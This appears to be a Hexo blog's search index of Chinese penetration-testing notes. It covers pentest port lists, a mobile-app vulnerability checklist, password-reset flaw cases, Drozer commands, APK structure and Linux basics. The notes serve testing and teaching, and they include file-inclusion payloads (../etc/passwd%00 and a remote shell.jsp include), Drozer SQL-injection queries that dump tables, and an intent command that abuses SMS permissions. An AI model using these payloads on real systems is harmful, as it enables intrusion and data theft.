<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[渗透测试中常见的端口]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%2F</url>
      <content type="text"><![CDATA[0x01 web类(web漏洞/敏感目录)第三方通用组件漏洞struts thinkphp jboss ganglia zabbix80 web80-89 web8000-9090 web 0x02 数据库类(扫描弱口令)1433 MSSQL1521 Oracle3306 MySQL5432 PostgreSQL 0x03 特殊服务类(未授权/命令执行类/漏洞)443 SSL心脏滴血873 Rsync未授权5984 CouchDB http://xxx:5984/_utils/6379 redis未授权7001,7002 WebLogic默认弱口令，反序列9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache未授权访问27017,27018 Mongodb未授权访问50000 SAP命令执行50070,50030 hadoop默认端口未授权访问 0x04 常用端口类(扫描弱口令/端口爆破)21 ftp22 SSH23 Telnet2601,2604 zebra路由，默认密码zebra3389 远程桌面 0x05 端口合计详情21 ftp22 SSH23 Telnet80 web80-89 web161 SNMP389 LDAP443 SSL心脏滴血以及一些web漏洞测试445 SMB512,513,514 Rexec873 Rsync未授权1025,111 NFS1433 MSSQL1521 Oracle:(iSqlPlus Port:5560,7778)2082/2083 cpanel主机管理系统登陆 （国外用较多）2222 DA虚拟主机管理系统登陆 （国外用较多）2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了3306 MySQL3312/3311 kangle主机管理系统登陆3389 远程桌面4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网5432 PostgreSQL5900 vnc5984 CouchDB http://xxx:5984/_utils/6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis未授权7001,7002 WebLogic默认弱口令，反序列7778 Kloxo主机控制面板登录8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上8080 tomcat/WDCP主机管理系统，默认弱口令8080,8089,9090 JBOSS8083 Vestacp主机管理系统 （国外用较多）8649 ganglia8888 amh/LuManager 主机管理系统默认端口9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞10000 Virtualmin/Webmin 服务器虚拟主机管理系统11211 memcache未授权访问27017,27018 Mongodb未授权访问28017 mongodb统计页面50000 SAP命令执行50070,50030 hadoop默认端口未授权访问]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[移动端常见漏洞检测方法]]></title>
      <url>%2F2017%2F01%2F11%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[本地文件包含检查要点是否可以包含本地任意文件 检查对象APP 检查方法1.通过AWVS扫描，查看扫面结果在，是否存在local file include漏洞2.更改参数的值为其他路径和文件进行验证，在浏览器地址栏中尝试一下URL：对于LINUX/UNIX服务器可以尝试包含/etc/passwdhttp://www.example.com/viewfile?fiilename=../etc/passwd对于Windows服务器可以尝试包含http://www.example.com/viewfile?fiilename=c:\boot.ini文件3.尝试使用截断，来绕过对文件类型的检查，例如：http://www.example.com/viewfile?fiilename=../../../../../../../etc/passwd%00 判断条件可以包含任意本地文件，如：/etc/passwd或者/boot.ini等，则不通过 远程文件包含检查要点是否可以远程包含文件 检查对象APP 检查方法1.通过AWVS扫描，查看扫描结果中，是否存在file include漏洞2.更改参数的值为本机的一个web服务根目录下的一个文件，例如shell.jsphttp://www.exmaple.com/viewfile.do?filename=http://192.168.110.160/shell.jsp3.常识使用截断，来绕过对文件类型的检查，例如：http://www.exmaple.com/viewfile.do?filename=http://192.168.110.160/etc/passwd%00 判断条件可以包含远程文件，如：包含http://www.baidu.com，则不通过 未授权访问检查要点是否存在垂直条件提升 检查对象APP 检查方法1.利用“敏感数据扫描工具”在不登陆情况下访问需要账号权限的URL2.查看扫描工具检测结果中可被未授权访问的URL3.对未授权访问的URL进行手工验证 判断条件能访问则不通过 越权访问检查要点1.是否使用低权限可以访问高权限账号的URL2.是否存在同级越权 检查对象APP 检查方法1.低权限账号可以访问高权限账号1)使用高权限账号登陆，抓取一下只有高权限账号才能登陆的URL2)退出高权限账号，使用低权限账号登陆后，尝试访问这些高权限账号能访问的URL2.同级别越权使用A账号能否访问B账号的特定数据，实现越权访问 判断条件低权限账号能访问高权限账号才能访问的URL能不通过；同级权限时，可访问其他账号特定数据，则不通过 短信接口恶意调用检查要点是否存在短信接口恶意调用 检查对象APP 检查方法1.在调用短信接口的过程中，使用burp进行抓包，修改发送目标与内容2.查看能否按照预定的发送短信 判断条件能给指定用户发送短信（短信内容可编辑），则不通过 Cookie重放检查要点是否存在Cookie重放 检查对象APP 检查方法1.使用burp进行抓包获取一个账号的登录cookie2.在异地使用编辑cookie功能设置刚才抓取的cookie，然后重放该攻击 判断条件能成功利用该cookie则不通过 Session失效检查要点是否在关闭浏览器、注销、超时的情况下session失效 检查对象APP 检查方法1.在正常业务操作中，通过burp抓取session id2.在关闭浏览器、注销、超时后分别执行第三步3.使用第一步抓取的session id访问(利用edit cookie访问某需要登录后次啊能访问的URL) 判断条件能访问则不通过 Session绕过检查要点是否存在Session绕过 检查对象APP 检查方法1.使用burp进行抓包获取一个正常业务操作的包，并删除session id后提交请求，查看是否可以成功访问 判断条件能访问则不通过 会话无Session校验检查要点是否存在会话无Session校验 检查对象APP 检查方法1.在正常业务操作中，对数据访问进行抓包，查看数据包中是否存在session等字段，如果没有，则进行如下操作2.在异地直接打开URL 判断条件能直接打开则不通过]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[常见安全漏洞及整改建议]]></title>
      <url>%2F2017%2F01%2F10%2F%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%95%B4%E6%94%B9%E5%BB%BA%E8%AE%AE%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[常见漏洞测试流程案例之账号注册、密码找回]]></title>
      <url>%2F2017%2F01%2F03%2F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%A1%88%E4%BE%8B%E4%B9%8B%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%2F</url>
      <content type="text"><![CDATA[账号注册唯一身份标识(非自增ID，如手机号，用户名等)重复注册漏洞编号：WooYun-2012-13986url：http://wooyun.jozxing.cc/static/bugs/wooyun-2012-013986.html唯一身份标识可以重复注册，会导致劫持前人的ID；如一个网站是以username作为唯一身份标识，当可以注册一个重复的username时候，进入个人空间会导致查询出错等问题。 没严格验证身份信息漏洞编号：WooYun-2014-87354url：http://wooyun.jozxing.cc/static/bugs/wooyun-2014-087354.html这种情况分为两种，第一种完全没有任意判断（不需要验证码和激活链接的）；第二种是需要激活账号的；第一种大家都知道，下面说说第二种，a用户用自己邮箱注册一个账号，然后拿到激活链接，然后在用别人的邮箱注册一次，然后再访问激活链接，这样情况严格来说是属于逻辑缺陷，但是账号注册这块挺重要的，就写在这里了。 垃圾账号注册漏洞编号：WooYun-2013-34225url：http://wooyun.jozxing.cc/static/bugs/wooyun-2013-034225.html在不判断用户身份信息以及没有验证码等限制的时候会导致垃圾账号批量注册，如以上漏洞，没有验证码，写个脚本跑一下就可以注册很多用户，可以用于恶意推销。 密码找回验证身份信息的验证码存储在客户端；漏洞编号：WooYun-2016-169802url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0169802.html手机邮箱找回验证码时，验证码返回到客户端的时候，可导致任意用户密码重置；如a用户在b.com找回一个不属于他的账号，手机号找回密码会发送验证码到那个手机号上，如果验证码也返回到客户端的话，a用户可以直接用该验证码重置那个账号的密码。 验证码爆破；漏洞编号：WooYun-2016-202426url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0202426.html现在网站都是基于验证码来判断用户身份的，这种方式是正确的，但是实现的过程可能会导致很多严重的安全问题，如验证码的有效期、验证码错误多少次会导致验证码过期，下面说的这种情况就是没有做任何处理的，比如手机密码找回，返回4位数的验证码且无任何限制，这种情况如上面漏洞案例所说的一样，可以爆破出验证码。 本地验证；漏洞编号：WooYun-2016-207115url：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0207115.html很多密码找回都是依靠返回的request的json的某个字段值来判断是否可以重置密码，然后再进行重置密码，这种情况就是本地验证，也就是说我们重置密码的过程，把返回包修改一下就可以重置密码了。这种情况出现过很多，都是没有经过二次判断的。感谢乌云的案例。 本文转载自：http://zone.secevery.com/?/article/370]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Drozer使用及相关命令]]></title>
      <url>%2F2017%2F01%2F02%2FDrozer%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[安装与启动安装第一步：从http://mwr.to/drozer下载Drozer (Windows Installer)第二步：在Android设备中安装agent.apk1adb install agent.apk 启动第一步：在PC上使用adb进行端口转发，转发到Drozer使用的端口314151adb forward tcp:31415 tcp:31415 安卓模拟器上需要先连:1adb connect 127.0.0.1:62001 第二步：在Android设备（手机或者平板）上开启Drozer Agent选择embedded server-enable第三步：在PC上开启Drozer console在安装目录cmd下输入连接命令:1drozer console connect(或者 drozer.bat console connect) 或者在adb下输入:1drozer console connect 如果报错，重启一下即可。 测试步骤获取包名 dz&gt; run app.package.list -f sieve com.mwr.example.sieve 获取应用的基本信息 run app.package.info -a com.mwr.example.sieve 确定攻击面 run app.package.attacksurface com.mwr.example.sieve 4.Activity （1）获取activity信息 run app.activity.info -a com.mwr.example.sieve （2）启动activity run app.activity.start –component com.mwr.example.sieve dz&gt; help app.activity.start usage: run app.activity.start [-h] [–action ACTION] [–category CATEGORY] [–component PACKAGE COMPONENT] [–data-uri DATA_URI] [–extra TYPE KEY VALUE] [–flags FLAGS [FLAGS …]] [–mimetype MIMETYPE] 5.Content Provider （1）获取Content Provider信息 run app.provider.info -a com.mwr.example.sieve （2）Content Providers（数据泄露） 先获取所有可以访问的Uri： run scanner.provider.finduris -a com.mwr.example.sieve 获取各个Uri的数据： run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical 查询到数据说明存在漏洞 （3）Content Providers（SQL注入） run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘“ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘“ 报错则说明存在SQL注入。 列出所有表： run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “ FROM SQLITE_MASTER WHERE type=’table’;–” 获取某个表（如Key）中的数据： run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “ FROM Key;–” （4）同时检测SQL注入和目录遍历 run scanner.provider.injection -a com.mwr.example.sieve run scanner.provider.traversal -a com.mwr.example.sieve 6 intent组件触发（拒绝服务、权限提升） 利用intent对组件的触发一般有两类漏洞，一类是拒绝服务，一类的权限提升。拒绝服务危害性比较低，更多的只是影响应用服务质量；而权限提升将使得没有该权限的应用可以通过intent触发拥有该权限的应用，从而帮助其完成越权行为。 1.查看暴露的广播组件信息： run app.broadcast.info -a com.package.name 获取broadcast receivers信息 run app.broadcast.send –component 包名 –action android.intent.action.XXX 2.尝试拒绝服务攻击检测，向广播组件发送不完整intent（空action或空extras）： run app.broadcast.send 通过intent发送broadcast receiver (1) 空action run app.broadcast.send –component 包名 ReceiverName run app.broadcast.send –component 包名 ReceiverName (2) 空extras run app.broadcast.send –action android.intent.action.XXX 3.尝试权限提升 权限提升其实和拒绝服务很类似，只不过目的变成构造更为完整、更能满足程序逻辑的intent。由于activity一般多于用户交互有关，所以基 于intent的权限提升更多针对broadcast receiver和service。与drozer相关的权限提升工具，可以参考IntentFuzzer，其结合了drozer以及hook技术，采用 feedback策略进行fuzzing。以下仅仅列举drozer发送intent的命令： （1）获取service详情 run app.service.info -a com.mwr.example.sieve 不使用drozer启动service am startservice –n 包名/service名 （2）权限提升 run app.service.start –action com.test.vulnerability.SEND_SMS –extra string dest 11111 –extra string text 1111 –extra string OP SEND_SMS 7.文件操作 列出指定文件路径里全局可写/可读的文件 run scanner.misc.writablefiles –privileged /data/data/com.sina.weibo run scanner.misc.readablefiles –privileged /data/data/com.sina.weibo run app.broadcast.send –component 包名 –action android.intent.action.XXX 8.其它模块 shell.start 在设备上开启一个交互shell tools.file.upload / tools.file.download 上传/下载文件到设备 tools.setup.busybox / tools.setup.minimalsu 安装可用的二进制文件]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[反编译APK后得到的几个文件和文件夹]]></title>
      <url>%2F2017%2F01%2F02%2F%E5%8F%8D%E7%BC%96%E8%AF%91APK%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9%2F</url>
      <content type="text"><![CDATA[文件功能概述assets文件夹此文件夹可以存放资源文件。至于是神马资源文件，怎么读取，这些我们就不用深究了，因为不常改。 res 文件夹主要用来存放资源。此文件夹下可以创建子文件，常见的有：1234567anim 动画drawable 图片color 颜色menu 菜单layout 布局values 常量值xml 任意xml文件 我们修改apk时，一般就在这里修改。比如汉化，改名称，去广告，改字体颜色，大小神马的。 smali主要是dex文件反编译得到的smali文件。不会java的改不起。顶多搜几个关键词汉化一下。值得注意的是，汉化时不能直接输入汉字，而应输入对应的十六进制代码。 AndroidManifest.xml此文件是apk中最重要的文件之一。它是apk的全局配置文件，提供了android系统所需要的关于该应用的必要信息。 功能细述res目录浅说anim文件夹后缀名为.xml。动画文件都放在这里。 drawable文件夹用于存放图片资源，图片或者xml。(1) 图片图片格式：png，9.png，jpg，gif注意：9.png是一种特殊的png格式，与一般的png格式有区别！很多人在改完图片后将两种格式混淆，导致回编译失败。后面有制作9.png格式图片的方法。(2) xmlxml文件通常为自定义的形状shape或图片选择器类selector似的东西，就是不同状态下不同的图片，用于设置background什么的。(3) drawable文件夹为了对屏幕的适配，对分辨率笼统的分： 名字可以为：123456drawable-ldpidrawable-mdpidrawable-hdpidrawable-xhdpdrawable-nodpidrawable-tvdpi 分辨率依次由高到低 具体到某一分辨率：drawable-分辨率，比如：drawable-1280x720 如果有横竖屏的区别，则命名为：drawable-land/port-mdpi， color文件夹用于存放color列表，和drawable的xml一样，表示不同状态下的不同颜色 menu文件夹菜单资源文件夹。 layout文件夹布局文件夹。此文件夹的名字也是可以起到屏幕适配的功能的。横竖屏：layout-land/port分辨率：layout-1280x720 values文件夹存放常量值的文件夹。里面常见的xml文件为：12345arrays.xml ： 资源数组colors.xml : 颜色值dimens.xml ： 像素值strings.xml ： 字符串值styles.xml ： 样式值 此文件夹，也有屏幕适配作用。比如：dimens在不同分辨率下的值。同样的是加-1280x720这样的后缀。对于strings，values文件夹有各种语言的版本对应。默认为英文。中文的文件夹名字应该是：12values-zh-rCN 简体中文values-zh-rTW 繁体中文 raw文件夹存放不需要系统编译成二进制的文件，例如字体文件等，同assets文件夹类似。 xml文件夹存放任意的xml文件。具体看名字。 移动端APP测试步骤改apk时，我们主要改两种，即图片和xml。 修改图片改图片最简单了，注意好格式，分辨率即可。但有一点需注意，就是9.png和png格式图片的区别。许多人没注意这点，导致回编译总是失败。下面讲9.png格式图片的制作。 介绍 9patchNinePatch.图片以*.9.png结尾，和普通图片的区别是四周多了一个边框左边那条黑色线代表图片垂直拉伸的区域，上边的那条黑色线代表水平拉伸区域，右边的黑色线代表内容绘制的垂直区域，下边的黑色线代表内容绘制的水平区域，右边和下边的线是可选的，左边和上边的线不能省略。采用NinePatch.图片做背景，可使背景随着内容的拉伸（缩小）而拉伸（缩小）总之，通俗的将，9patch格式的图片就是有些部位能伸缩，有些部位不能的特殊png格式图片。 将png转化为9.png步骤如下第一步，下载9妹工具，一楼工具包里有，双击打开draw9patch.bat，将图片拖到软件界面编辑。第二步，勾选软件下面的三个选项，全选就对了。第三步，把鼠标放到图片中央，此时你会看到图片四周有1像素的透明带第四步，在左边和上边的透明带上各画一条黑线（鼠标拖动即可）注意：当图片过大时上边的透明带会被黄色的提示框遮住，此时只能多点击黄色区域自己摸索透明带的位置。第五步，保存，这个不用多说吧。至此，将图片替换回原来的文件夹即可。需要注意的是，刚编辑的9patch.图片不能直接拖到原apk中，而应回编译后再替换进去。 修改xml改字体，软件全局背景，汉化，去广告神马的都通过这种方式。我们常改的是layout，drawable，values目录下的xml文件，如果要改桌面插件，要去xml文件夹中修改。必要时也可尝试修改AndroidManifest.xml。下面是常见代码（分类非标准） 引用（@）引用自定义的资源形式1@[package:]type/name 如 @android:text=”@string/hello”这里使用”@”前缀引入对一个资源的引用，后面的string/hello就是我们自定义的资源。 引用系统资源形式1@android:type/name 如 android:textColor=”@android:color/opaque_red” 指定package:android 引用主题属性形式 @android:type/name即引用当前主题中的属性的值。 文本（text）123456789101112textColor 文本颜色textColorHighlight 被选中文字的底色，默认为蓝色textColorHint 提示信息文字的颜色，默认为灰色。与hint一起使用textColorLink 文字链接的颜色textScaleX 设置文字之间间隔，默认为1.0ftextSize 文字大小textStyle 字形typeface 文本字体height 文本区域的高度maxHeight 文本区域的最大高度width 文本区域的宽度lines 文本的行数 视图（view）123456789background 背景色/背景图片（@null 透明）clickable 是否响应点击事件focusable 是否获得焦点minHeight 视图最小高度 minWidth 视图最小宽度padding 上下左右的边距scrollbar 滚动条（none 隐藏，horizontal 水平，vertical 垂直）tag 文本标签visibility 是否显示View（visible 默认值，显示；invisible 不显示，但是仍然占用空间；gone 不显示，不占用空间） 布局（layout）12345678910111213LinearLayout 线性布局FrameLayout 单帧布局RelativeLayout 相对布局AbsoluteLayout 绝对布局TableLayout 表格布局layout_width 宽度layout_height 高度fill_patent 布满屏幕wrap_content 适合大小foreground 前景background 背景gravity 位置（center_vertical 居中；top 顶部，默认；bottom 底部）orientation 定向（horizontal 水平，vertical 垂直） 主题（theme）1234567891011121314151617Theme.Dialog 对话框模式Theme.NoTitleBar 无标题栏Theme.NoTitleBar.Fullscreen 无标题栏，全屏Theme.Light 白色背景Theme.Light.NoTitleBar 白色背景，无标题栏Theme.Light.NoTitleBar.Fullscreen 白色背景，无标题栏，全屏Theme.Black 黑色背景Theme.Black.NoTitleBar 黑色背景并，无标题栏Theme.Black.NoTitleBar.Fullscreen 黑色背景，无标题栏，全屏Theme.Wallpaper 桌面背景Theme.Wallpaper.NoTitleBar 桌面背景，无标题栏Theme.Wallpaper.NoTitleBar.Fullscreen 桌面背景，无标题栏，全屏Theme.Translucent 半透明效果Theme.Translucent.NoTitleBar 半透明，无标题栏Theme.Translucent.NoTitleBar.Fullscreen 半透明效果，无标题栏，全屏Theme.Panel 面板风格显示Theme.Light.Panel 平板风格显示 颜色（color）1) @color/×× 引用自定义的颜色，一般在res/values/colors.xml中2) @android:color/×× 引用系统颜色3) #×××××××× #后一共8个字符，由0~9，a~f组成。前两位是透明度，00表示全透明，ff表示不透明。后6位是RRGGBB，R红G绿B蓝，000000为白，ffffff为黑 单位1234567px 像素点in 英寸mm 毫米pt 磅，1/72 英寸dp 一个基于density的抽象单位，如果一个160dpi的屏幕，1dp=1pxdip 等同于dpsp 同dp相似，但还会根据用户的字体大小偏好来缩放。 注意：sp一般是文本的单位，dip最常用]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[adb logcat命令查看并过滤android输出log]]></title>
      <url>%2F2017%2F01%2F02%2Fadb-logcat%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8B%E5%B9%B6%E8%BF%87%E6%BB%A4android%E8%BE%93%E5%87%BAlog%2F</url>
      <content type="text"><![CDATA[cmd命令行中使用adb logcat命令查看Android系统和应用的log，dos窗口按ctrl+c中断输出log记录。 logcat日志中的优先级/tag标记android输出的每一条日志都有一个标记和优先级与其关联。优先级是下面的字符，顺序是从低到高：1234567V — 明细 verbose(最低优先级)D — 调试 debugI — 信息 infoW — 警告 warnE — 错误 errorF — 严重错误 fatalS — 无记载 silent 标记是一个简短的字符串，用于标识原始消息的来源。如下是一个日志输出的消息，优先级是“D”，标记是“PowerManagerService”：1D/PowerManagerService( 305): onSensorChanged: light value: 306.0 使用logcat命令查看android日志输出12adb logcat //显示全部日志adb logcat &gt; c:\test.log //将日志保存到文件test.log 根据tag标记和级别过滤日志输出仅输出标记为“ActivityManager”且优先级大于等于“Info”和标记为“PowerManagerService”并且优先级大于等于“Debug”的日志：1adb logcat ActivityManager:I PowerManagerService:D *:S 注：:S用于设置所有标记的日志优先级为S，这样可以确保仅输出符合条件的日志。adb logcat :W //显示所有优先级大于等于“warning”的日志adb logcat -s PowerManagerService //显示PowerManagerService的日志信息 Logcat命令列表12345678910111213141516171819-d 将日志显示在控制台后退出-c 清理已存在的日志-f &lt;filename&gt; 将日志输出到文件***adb logcat -f /sdcard/test.txt***-v &lt;format&gt;设置日志输入格式控制输出字段，默认的是brief格式brief — 显示优先级/标记和原始进程的PID (默认格式)process — 仅显示进程PIDtag — 仅显示优先级/标记thread — 仅显示进程：线程和优先级/标记raw — 显示原始的日志信息，没有其他的元数据字段time — 显示日期，调用时间，优先级/标记，PIDlong —显示所有的元数据字段并且用空行分隔消息内容***adb logcat -v thread //使用 thread 输出格式******注意-v 选项中只能指定一种格式。***-b &lt;buffer&gt;加载一个可使用的日志缓冲区供查看，默认值是main。radio — 查看包含在无线/电话相关的缓冲区消息***adb logcat -b radio //查看radio缓冲区***events — 查看事件相关的消息main — 查看主缓冲区 (默认缓冲区) 1adb push pull 下载D:>adb pull /data/ d:\data第一个data是手机或模拟器目录第二个data是PC的目录 上传adb push D:\file.txt /system/temp/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Dorzer之环境配置]]></title>
      <url>%2F2017%2F01%2F02%2FDorzer%E4%B9%8B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[1、在 PC 上使用 adb 进行端口转发，转发到 Drozer使用的端口 31415adb forward tcp:31415 tcp:31415 2.问题一 E:\tools\移动端\drozer&gt;drozer.bat console connect出现如下错误If this error persists, specify the path in the ~/.drozer_config file: [executables] java = C:\path\to\java 解决方法： 将以下代码保存到文本中[executables] java = C:\ProgramFiles\Java\jdk1.8.0_71\bin\java.exe javac = C:\ProgramFiles\Java\jdk1.8.0_71\bin\javac.exejava.exe 和javac.exe的文件路径按以上格式写好，保存在1.drozer_config文件中，用 rename1.drozer_config .drozer_config将1.drozer_config文件名改为.drozer_config，将.drozer_config文件保存 在”c:\users\你的用户名”文件夹下。 3.问题二**图片1-2 **出现此错误只需要重启一下就可以了。4.问题三 ErrNo 10061 解决方法： 首先检查adb可正确，adb shell能不能进去，如果能那么输入 adb forward tcp:31415 tcp:31415再drozer.bat console connect即可]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[运行javac报告javac不是内部或外部命令，但是运行java、java -version正常]]></title>
      <url>%2F2017%2F01%2F01%2F%E8%BF%90%E8%A1%8Cjavac%E6%8A%A5%E5%91%8Ajavac%E4%B8%8D%E6%98%AF%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%90%E8%A1%8Cjava%E3%80%81java-version%E6%AD%A3%E5%B8%B8%2F</url>
      <content type="text"><![CDATA[安装jdk经常遇到这种情况，下面分享解决方法。 配置环境变量包括JAVA_HOME，PATH和CLASSPATH三个部分用鼠标右击“我的电脑”，选择“属性”-&gt;“高级”-&gt;“环境变量”-&gt;“系统变量”-&gt;“新建”在“变量名”输入框中写入“JAVA_HOME”，在“变量值”输入框中写入“D:\Java\jdk1.8.0_66” （根据安装路径填写），然后点击“确定”，JAVA_HOME就设置完成了。 JAVA_HOME 添加jdk的安装目录，注意JAVA_HOME要书写正确：安装目录后边不要加分号。我的jdk安装在： 下面是“CLASSPATH”的配置。选中“系统变量”查看是否有CLASSPATH项目，如果没有就点击“新建”，如果已经存在就选中CLASSPATH选项，点击“编辑”按钮，然后在“变量名”中填写“CLASSPATH”，在“变量值”中填写“.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar”（根据安装路径填写）。注意这个地方不要漏掉最前面的 点 . 在原来的path值后面添加 ;D:\Java\jdk1.8.0_66\bin;D:\Java\jre1.8.0_66\bin 我，cmd中执行java命令正常，输入javac会提示不是内部命令。。。 重点确定后，重新启动cmd，输入javac 这次就好用了。记得要重启。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux操作系统基础命令]]></title>
      <url>%2F2016%2F11%2F30%2FLinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[目录和文件查看目录pwd #显示目前所在目录ls -al 进入目录cd #变换目录如 cd /etc 查看文件cat 文件名-n：打印出行号（包括空白行）-b：列出行号，空白行不标号nl #添加行号打印 more #可翻页显示空格键：向下翻一页Enter：向下翻一行/字符串：向下搜索【字符串】q：离开 less #一页一页翻动 目录或文件的复制cp [参数] 源文件 目标文件-a：相当于-pdr的意思-d：若源文件为链接文件的属性，则复制链接文件属性而非档案本身-i：若目标文件已经存在，在覆盖式会先询问动作的进行-p：连同档案的属性一起复制过去，而非使用默认属性（备份常用）-r：递归持续复制，用于目录的复制行为（常用） 目录或文件的删除rm [ -fir ] 档案或目录-f：强制删除-i：互动模式，在删除前询问操作者-r：递归删除（非常危险的选项！！！） 目录或文件的移动mv [ -fiu ] 源文件 目标文件-f：force强制，若目标以存在，不询问直接覆盖-i：若目标文档已经存在，就会询问是否覆盖-u：若目标文档已存在，且源文件source比较新，才会更新 当前活动目录：工作目录当前用户家目录：就是当前用户的目录，比如root用户的家目录是/root,zheng用户的家目录是/home/zheng 文件类型 普通文件d 目录文件l 链接文件s 套接字文件b 块设备文件，二进制文件c 字符设备文件p 命令管道文件 文件权限和文件夹权限r ：readw：writex：execute 文件查看与编辑文件查看touchcatmorelessheadtailvivim 文件编辑viecho 查看文件头head #取出前几行（默认10行） 查看文件尾tail #去除末尾几行 vi的三种模式命令行模式插入模式末行模式 vi对文件的打开、输入和保存1vi filename #打开文件 进入插入模式：iesc:wq（保存并退出）q（没有修改文件的前提下直接退出）q! （不保存并强制退出） vi光标移动（命令行模式）：0 #光标移动到行首$ #光标移动到行末gg #移动到首行G #光标到末行（4G ：光标移动到第四行）H #光标到当前屏幕的第一行L #光标到当前屏幕的最后行M #光标到当前屏幕的中间行w或W #向右移动到下一个单词首e或E #下一个单词词尾b或B #上一个单词首x 删除光标处的字符 （3x 删除从光标所在位置开始向右的3个字符）X 删除光标前的字符 （3X 删除从光标前那个位置开始向左的3个字符）d$ 删除光标位置到行末5dd 剪切5行4yy 复制4行p 向下粘贴P 向上粘贴u 撤销U撤销一次ｖ＋ 方向键 可以从当前光标处各方向选择字符或行/xxx（默认向下搜索） n查找下一个xxx?xxx 向上搜索 N（向上搜索）ctrl + g 显示文本信息 文本插入模式：i #当前光标处插入I #当前光标后一位插入a #在光标后追加A #行尾插入o #向下新建一行插入O #向上新建一行插入 v 上下移动之后 选中y 复制p 粘贴 文本的搜索和替换：:s/123/abc/g #将一整行中的123用abc替换:%s/123/abc/g #全局替换: n #跳到第n行:$ #跳到最后一行:set number #显示行号 磁盘查看磁盘fdisk -l 命令挂载磁盘mount -t etx3 -o rw /dev/sdb1 /mnt/333 分区/dev/sda1 /dev/sdb1 #分区命名 格式化分区mkfs.ext3 /dev/sdb1 永久挂载磁盘/etc/fstab 网络命令 – 网络配置ifconfig 网卡名 IP netmask 255.xxx.xxx.xxxroute add default gw 网关 文件 – 网络配置/etc/sysconfig/network-scripts/ifcfg-ethN主要信息： DEVEICE=网卡名 ONBOOT=开机自动加载（yes/no） BOOTPRO=启动协议（static静态/dhcp动态） IPADDR=IP地址 NETMASK=子网掩码 GATEWAY=网关 如何配置tcp数据转发（ip_forward）?echo “ 1” &gt; /proc/sys/net/ipv4/ip_forward 如何配置DNS地址？echo “nameservice DNS”&gt;&gt;/etc/resolv.conf 配置静态路由route add -net IP地址 netmask 子网掩码 dev 网络接口 nslookup #查询域名对应的IP dig #显示域名的高级数据 finger #查询用户的信息，通常会显示系统中某个用户的用户名、主目录、停滞时间、登陆时间、登录shell等信息 ping #测试网络主机是否工作 netstat#用于查询各种网络相关信息。显示网络连接、路由表和网络接口状态等信息，可以让用户得知目前都有哪些网络连接在运行。-a （all） 显示所有选项，默认不现实LISTEN相关-t （tcp）进现实tcp相关选项-u （udp）仅显示udp相关选项-n 拒绝显示别名，能显示数字的全部，这里我理解为IP-l 仅列出有在listen（监听）的服务状态 用户管理添加用户 useradd添加组 groupadd初始用户组 有效用户组 -g -G删除用户userdel -r （删除用户家目录）用户名 用户相关配置文件/etc/passwd 用户名:用户密码:用户ID:组ＩＤ:注释:家目录:shell /etc/group存储有关本地用户组的信息1）groupname GID到名称的一种映射，组名2）password 保存密码的位置3）GID 组ID4）user 组成员/etc/shadow sudo 添加sudo用户 在visudo中（root用户权限才能运行） chmod u g o r+w+x （4 2 1）文件或目录 chown 改变拥有者和群组chown mail:mail log2012.log 改变文件拥有者和群组chown root: log2012.log 改变文件群组chown :mail log2012.log 改变指定目录以及其子目录下的所有文件的拥有者和群组chown -R -v root:mail test6 